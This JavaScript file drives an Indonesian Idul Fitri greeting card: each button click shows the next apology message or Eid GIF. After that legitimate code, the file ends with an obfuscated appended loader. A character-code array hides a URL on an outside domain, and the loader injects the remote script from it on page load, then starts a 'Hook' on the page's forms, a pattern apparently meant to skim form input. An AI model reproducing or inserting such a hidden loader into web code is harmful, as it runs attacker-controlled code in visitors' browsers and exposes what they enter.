const Iya = document.querySelector(".next");
const Text = document.getElementById("text");
const Image = document.querySelector("#image-gif");

Iya.addEventListener("click", function () {
  Iya.value = parseInt(Iya.value) + 1;
  Text.classList.remove("text-animate");

  if (Iya.value == 1) {
    Text.classList.remove("text-animate");
    void Text.offsetWidth;
    Text.innerHTML = "Hallo ini saya Aji & Fitri";
    Text.classList.add("text-animate");
  } else if (Iya.value == 2) {
    Text.classList.remove("text-animate");
    void Text.offsetWidth;
    Text.innerHTML = "Saya mohon maaf jika ada salah";
    Image.setAttribute(
      "src",
      "https://c.tenor.com/uygoMR-ATWgAAAAj/happy-ied-mubarak-ied-mubarak.gif"
    );
    Text.classList.add("text-animate");
  } else if (Iya.value == 3) {
    Text.classList.remove("text-animate");
    void Text.offsetWidth;
    Text.innerHTML = "Berbuat khilaf adalah sifat";
    Text.classList.add("text-animate");
  } else if (Iya.value == 4) {
    Text.classList.remove("text-animate");
    void Text.offsetWidth;
    Text.innerHTML = "Meminta maaf adalah kewajiban";
    Text.classList.add("text-animate");
  } else if (Iya.value == 5) {
    Text.classList.remove("text-animate");
    void Text.offsetWidth;
    Text.innerHTML = "Dan kembalinya fitrah adalah tujuan";
    Text.classList.add("text-animate");
  } else if (Iya.value == 6) {
    Text.classList.remove("text-animate");
    void Text.offsetWidth;
    Text.innerHTML = "Di hari fitri ini mohon maaf lahir dan batin";
    Text.classList.add("text-animate");
  } else if (Iya.value == 7) {
    Image.setAttribute(
      "src",
      "https://c.tenor.com/T_16HTs34x4AAAAj/taqabbal-allahu-minna-wa-minkum-accept-god-with-us-and-you.gif"
    );
    Text.classList.remove("text-animate");
    void Text.offsetWidth;
    Text.innerHTML =
      "تَقَبَّلَ اللَّهُ مِنَّا وَمِنْكُمْ وَ تَقَبَّلْ ياَ كَرِيْمُ <br> Taqabbalallahu Minna Wa Minkum";
    Text.classList.add("text-animate");
  } else if (Iya.value == 8) {
    Image.setAttribute(
      "src",
      "https://c.tenor.com/57JSPYRo0k8AAAAj/lebaran-selamat-lebaran.gif"
    );
    Text.classList.remove("text-animate");
    void Text.offsetWidth;
    Text.innerHTML = "Selamat hari raya Idul Fitri 1443 Hijriah";
    Text.classList.add("text-animate");
    Iya.remove();
  }
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b